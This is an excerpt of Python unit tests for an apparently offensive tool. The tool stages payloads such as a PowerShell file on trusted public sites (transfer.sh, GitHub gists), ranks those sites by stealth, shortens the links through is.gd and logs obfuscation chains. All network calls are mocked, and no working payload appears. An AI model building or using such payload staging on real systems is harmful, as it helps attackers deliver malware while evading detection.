...
class TestStageLive:
    ...
    def test_transfer_sh_successful_upload(self, stager: LOTSStager):
        ...
        with patch("forge.phase3.lots_stager._get_cffi_session") as mock_sess_fn:
            ...
            with patch("forge.phase3.lots_stager._IsGdShortener.shorten", return_value="https://is.gd/aBcDeF"):
                result = stager.stage(b"content", "payload.ps1",
                                      category=LOTSCategory.FILE_TRANSFER, one_time=True)
    ...
    def test_upload_failure_raises_staging_backend_error(self, stager: LOTSStager):
        ...
        with patch("forge.phase3.lots_stager._get_cffi_session") as mock_sess_fn:
            ...
            with pytest.raises(StagingBackendError):
                stager.stage(b"content", "payload.ps1",
                             category=LOTSCategory.FILE_TRANSFER, one_time=False)
    ...
    def test_gist_backend_requires_github_token(self, stager: LOTSStager, monkeypatch):
        ...
        site = LOTSSite(
            domain="gist.github.com", category=LOTSCategory.CODE_SHARING,
            requires_auth=True, stealth_rank=3,
        )
...
class TestShortenerBackends:
    ...
    def test_shorten_url_calls_backend_once(self, stager: LOTSStager):
        with patch("forge.phase3.lots_stager._IsGdShortener.shorten",
                   return_value="https://is.gd/once") as mock_shorten:
...
class TestPayloadBuilder:
    ...
    def test_persist_record_writes_sha256_not_plaintext(
        ...
        with sqlite3.connect(tmp_eng_db) as conn:
            row = conn.execute("SELECT content_hash, obfuscation_chain FROM payloads LIMIT 1").fetchone()
